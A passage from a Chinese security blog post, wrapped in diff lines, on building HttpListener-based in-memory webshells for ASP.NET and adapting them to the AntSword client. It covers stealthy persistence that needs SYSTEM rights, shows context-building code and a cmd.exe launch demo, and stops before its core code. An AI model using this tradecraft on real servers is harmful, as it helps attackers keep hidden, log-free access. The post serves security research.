@@ -1,0 +1,890 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>ASP.NET下的内存马(三)：HttpListener内存马 - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="ASP.NET下的内存马(三)：HttpListener内存马" />
+<meta property="og:description" content="本文首发于：https://tttang.com/archive/1451/ 1 前言asp.net下的内存马研究文章比较少，目前提到过的包括虚" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yzddmr6.com/posts/asp-net-memory-shell-httplistener/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-05-04T15:10:27+00:00" />
+<meta property="article:modified_time" content="2022-05-04T15:10:27+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
+
+<meta name="twitter:title" content="ASP.NET下的内存马(三)：HttpListener内存马"/>
+<meta name="twitter:description" content="本文首发于：https://tttang.com/archive/1451/ 1 前言asp.net下的内存马研究文章比较少，目前提到过的包括虚"/>
+<meta name="application-name" content="yzddMr6&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://yzddmr6.com/posts/asp-net-memory-shell-httplistener/" /><link rel="prev" href="https://yzddmr6.com/posts/as-exploits-sharploader/" /><link rel="next" href="https://yzddmr6.com/posts/asp-net-memory-shell-virtualpath/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "ASP.NET下的内存马(三)：HttpListener内存马",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yzddmr6.com\/posts\/asp-net-memory-shell-httplistener\/"
+        },"genre": "posts","wordcount":  4715 ,
+        "url": "https:\/\/yzddmr6.com\/posts\/asp-net-memory-shell-httplistener\/","datePublished": "2022-05-04T15:10:27+00:00","dateModified": "2022-05-04T15:10:27+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/yzddmr6.com\/images\/avatar.webp",
+                    "width":  640 ,
+                    "height":  640 
+                }},"author": {
+                "@type": "Person",
+                "name": "yzddMr6"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">yzddMr6&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/showcase/"> 作品 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">yzddMr6&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/showcase/" title="">作品</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#关于httplistener">关于HttpListener</a></li>
+    <li><a href="#基本使用">基本使用</a></li>
+    <li><a href="#武器化踩坑">武器化踩坑</a>
+      <ul>
+        <li><a href="#入口参数问题">入口参数问题</a></li>
+        <li><a href="#蚁剑获取网站根路径的问题">蚁剑获取网站根路径的问题</a></li>
+        <li><a href="#request无法获取post参数的问题">Request无法获取POST参数的问题</a></li>
+      </ul>
+    </li>
+    <li><a href="#核心代码">核心代码</a></li>
+    <li><a href="#测试">测试</a></li>
+    <li><a href="#参考链接">参考链接</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">ASP.NET下的内存马(三)：HttpListener内存马</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"><i class="far fa-folder fa-fw"></i>技术文章</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-05-04">2022-05-04</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2022-05-04">2022-05-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 4715 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 10 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#关于httplistener">关于HttpListener</a></li>
+    <li><a href="#基本使用">基本使用</a></li>
+    <li><a href="#武器化踩坑">武器化踩坑</a>
+      <ul>
+        <li><a href="#入口参数问题">入口参数问题</a></li>
+        <li><a href="#蚁剑获取网站根路径的问题">蚁剑获取网站根路径的问题</a></li>
+        <li><a href="#request无法获取post参数的问题">Request无法获取POST参数的问题</a></li>
+      </ul>
+    </li>
+    <li><a href="#核心代码">核心代码</a></li>
+    <li><a href="#测试">测试</a></li>
+    <li><a href="#参考链接">参考链接</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><meta name="referrer" content="no-referrer" />
+<p>本文首发于：https://tttang.com/archive/1451/</p>
+<h2 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>1 前言</h2><p>asp.net下的内存马研究文章比较少，目前提到过的包括虚拟路径内存马以及HttpListener内存马。最近研究了一下其他类型的内存马，发现.net可以利用的地方要多得多。所以准备写个系列文章，讲一讲asp.net下的内存马。</p>
+<p><strong>文章仅作研究性质，不保证任何实战效果，请勿用于非法用途。</strong></p>
+<p>今天讲一种特殊的内存马：基于HttpListener实现的内存马。</p>
+<h2 id="关于httplistener" class="headerLink">
+    <a href="#%e5%85%b3%e4%ba%8ehttplistener" class="header-mark"></a>2 关于HttpListener</h2><p>HttpListener进一步的简化了Http协议的监听，仅需通过字符串的方法提供监听的地址和端口号以及虚拟路径，就可以开始监听工作了。与 IIS 上发布网站相比，使用 HttpListener 编程的程序更加轻量化，易于发布和更新。配合 Thread 或 Task 类也可以支持一定的并发。</p>
+<p>HttpListener的全限定类名是System.Net.HttpListener，这个类的主要作用就是启动一个简单的Web Server。个人理解就类似python的python -m http.server一样，可以很快启动一个简单的Http服务。在这里可以看到他的官方文档：https://docs.microsoft.com/zh-cn/dotnet/api/system.net.httplistener?view=net-6.0</p>
+<p>之所以说这种方式比较特殊是因为这种方式相当于重新起了一个全新的Web。有点类似于，攻击者打进去服务器后，给目标装了一个DVWA。并且这种内存马必须要System权限才能启动。主要用于权限的维持。优点在于可以端口复用，并且因为是攻击者启动的Server所以不会在原有的Web中留下日志。</p>
+<p>这种利用方式最早应该是出现在头像哥Exchange的exp里https://github.com/zcgonvh/CVE-2020-17144，后来Hiding师傅在文章中对其进行详细的解释，并且实现了哥斯拉可以连接的Demo：https://github.com/A-D-Team/SharpMemshell/tree/main/HttpListener</p>
+<h2 id="基本使用" class="headerLink">
+    <a href="#%e5%9f%ba%e6%9c%ac%e4%bd%bf%e7%94%a8" class="header-mark"></a>3 基本使用</h2><p>以下是微软官方文档给出的样例，其中主要的部分在代码中已经注释</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="c1">// This example requires the System and System.Net namespaces.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">public</span> <span class="k">static</span> <span class="kt">void</span> <span class="nf">SimpleListenerExample</span><span class="p">(</span><span class="n">string</span><span class="p">[]</span> <span class="n">prefixes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">HttpListener</span><span class="p">.</span><span class="n">IsSupported</span><span class="p">)</span><span class="c1">//判断是否支持HttpListener类型
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span> <span class="p">(</span><span class="s">&#34;Windows XP SP2 or Server 2003 is required to use the HttpListener class.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// URI prefixes are required,
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// for example &#34;http://contoso.com:8080/index/&#34;.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">prefixes</span> <span class="o">==</span> <span class="n">null</span> <span class="o">||</span> <span class="n">prefixes</span><span class="p">.</span><span class="n">Length</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span><span class="c1">//判断URL格式是否正确
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">throw</span> <span class="k">new</span> <span class="n">ArgumentException</span><span class="p">(</span><span class="s">&#34;prefixes&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 创建一个HttpListener对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">HttpListener</span> <span class="n">listener</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HttpListener</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Add the prefixes.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">foreach</span> <span class="p">(</span><span class="n">string</span> <span class="n">s</span> <span class="n">in</span> <span class="n">prefixes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">listener</span><span class="p">.</span><span class="n">Prefixes</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">listener</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Listening...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 从上下文中获取Request，Response对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">HttpListenerContext</span> <span class="n">context</span> <span class="o">=</span> <span class="n">listener</span><span class="p">.</span><span class="n">GetContext</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HttpListenerRequest</span> <span class="n">request</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">Request</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Obtain a response object.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">HttpListenerResponse</span> <span class="n">response</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">Response</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 设置返回的信息
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">string</span> <span class="n">responseString</span> <span class="o">=</span> <span class="s">&#34;&lt;HTML&gt;&lt;BODY&gt; Hello world!&lt;/BODY&gt;&lt;/HTML&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">byte</span><span class="p">[]</span> <span class="n">buffer</span> <span class="o">=</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">responseString</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 写入到输出流中
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">response</span><span class="p">.</span><span class="n">ContentLength64</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Stream</span> <span class="n">output</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">OutputStream</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">output</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">buffer</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// You must close the output stream.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">output</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">listener</span><span class="p">.</span><span class="n">Stop</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>按照官方的代码样例来分析</p>
+<ol>
+<li>判断是否支持HttpListener</li>
+<li>创建HttpListener对象</li>
+<li>添加URL路径</li>
+<li>调用HttpListener.Start()启动Server</li>
+<li>Listener.GetContext()获取上下文Context，并编写自己的处理逻辑</li>
+<li>调用Listener.Stop()停止Server</li>
+</ol>
+<p>具体的使用场景以及方式Hiding在文章中已经写的非常清楚了，本文主要讲一讲蚁剑武器化过程中遇到的各种坑。</p>
+<h2 id="武器化踩坑" class="headerLink">
+    <a href="#%e6%ad%a6%e5%99%a8%e5%8c%96%e8%b8%a9%e5%9d%91" class="header-mark"></a>4 武器化踩坑</h2><h3 id="入口参数问题" class="headerLink">
+    <a href="#%e5%85%a5%e5%8f%a3%e5%8f%82%e6%95%b0%e9%97%ae%e9%a2%98" class="header-mark"></a>4.1 入口参数问题</h3><p>在蚁剑C#类型的设计之初定义了三种入口参数，用于获取当前上下文的Request跟Response</p>
+<ol>
+<li>System.Web.HttpContext对象</li>
+<li>包含System.Web.Request与System.Web.Response对象的数组</li>
+<li>自动通过HttpContext.Current来拿到当前的Context</li>
+</ol>
+<p>System.Net.HttpListenerContext跟System.Web.HttpContext长得有点像，但其实是两个八竿子打不着的东西，无法直接转换，或者从一个中提取出另一个。</p>
+<p>同样Listener中的Request是System.Net.HttpListenerRequest，属于不一样的实现。查看文档后发现，Listener的Request非常的原始，很多方法都没有，并不像Router内存马一样把System.Web.Request包了一层。所以也是没有办法直接转换的。</p>
+<p>HttpListener实际上相当于新启动了一个进程，在里面调用HttpContext.Current的结果会是一个null，所以自动化提取Context也不太行。</p>
+<p>Hiding师傅在他的文章里面给出了一种解决办法：通过提取HttpListenerRequest，HttpListenerResponse的参数来构造一个我们可以用的System.Web.Request跟System.Web.Response对象，然后作为参数实例化一个System.Web.HttpContext。</p>
+<p>具体代码实现如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">HttpListenerContext</span> <span class="n">context</span> <span class="o">=</span> <span class="n">listener</span><span class="p">.</span><span class="n">GetContext</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">HttpListenerRequest</span> <span class="n">request</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">Request</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">HttpListenerResponse</span> <span class="n">response</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">Response</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">HttpRequest</span> <span class="n">req</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HttpRequest</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">,</span> <span class="n">request</span><span class="p">.</span><span class="n">Url</span><span class="p">.</span><span class="n">ToString</span><span class="p">(),</span> <span class="n">request</span><span class="p">.</span><span class="n">QueryString</span><span class="p">.</span><span class="n">ToString</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">StreamWriter</span> <span class="n">writer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">StreamWriter</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">OutputStream</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">HttpResponse</span> <span class="n">resp</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="n">writer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">HttpContext</span> <span class="n">httpContext</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HttpContext</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">resp</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>看起来没问题了，文章中的代码用哥斯拉也可以正常连接，但是实际上这里构造出来的req并不是一个完整的HttpRequest，为下面的坑埋下了伏笔。</p>
+<h3 id="蚁剑获取网站根路径的问题" class="headerLink">
+    <a href="#%e8%9a%81%e5%89%91%e8%8e%b7%e5%8f%96%e7%bd%91%e7%ab%99%e6%a0%b9%e8%b7%af%e5%be%84%e7%9a%84%e9%97%ae%e9%a2%98" class="header-mark"></a>4.2 蚁剑获取网站根路径的问题</h3><p>最开始改了一版代码后一直无法连接，查看代码发现当时蚁剑在获取基本信息的时候使用的是HttpContext.Current.Server.MapPath(&quot;/&quot;)来获取根路径，在exe中HttpContext.Current为空，所以这句就会报一个空指针错误。修改为AppDomain.CurrentDomain.BaseDirectory即可。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1645335819441-764eaeee-66ed-4e0a-9b92-774297393fc8.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1645335819441-764eaeee-66ed-4e0a-9b92-774297393fc8.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1645335819441-764eaeee-66ed-4e0a-9b92-774297393fc8.png"
+            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1645335819441-764eaeee-66ed-4e0a-9b92-774297393fc8.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1645335819441-764eaeee-66ed-4e0a-9b92-774297393fc8.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1645335819441-764eaeee-66ed-4e0a-9b92-774297393fc8.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="request无法获取post参数的问题" class="headerLink">
+    <a href="#request%e6%97%a0%e6%b3%95%e8%8e%b7%e5%8f%96post%e5%8f%82%e6%95%b0%e7%9a%84%e9%97%ae%e9%a2%98" class="header-mark"></a>4.3 Request无法获取POST参数的问题</h3><p>这个点当时也被坑了很久，修了上面的问题之后测试连接提示正常，但是打开路径会返回空指针错误。</p>
+<p>以为是路径模块写的有问题，结果发现cmd也不能用，数据库也不能用。但是确实基本信息是可以获取到的，非常奇怪。</p>
+<p>由于Listener马必须要在System权限下运行，Rider用管理员权限打开后还是无法调试，所以就采用了一个笨办法：编译成exe-&gt;管理员打开-&gt;Console.WriteLine打印信息。。。</p>
+<p>由于蚁剑的Payload也都是assembly的形式打进去的，不能直接调试，还是用打印的办法调试。。。总之调试的过程就是非常恶心。。。</p>
+<p>甚至写了一个弹计算器的demo，发现还是可以正常运行，但是一放到蚁剑中的Payload就是不能跑。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="k">public</span> <span class="n">string</span> <span class="nf">calc</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Process</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">FileName</span> <span class="o">=</span> <span class="s">&#34;cmd.exe&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">Arguments</span> <span class="o">=</span> <span class="s">&#34;/c &#34;</span> <span class="o">+</span> <span class="s">&#34;calc&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">UseShellExecute</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">RedirectStandardOutput</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">RedirectStandardError</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s">&#34;success&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
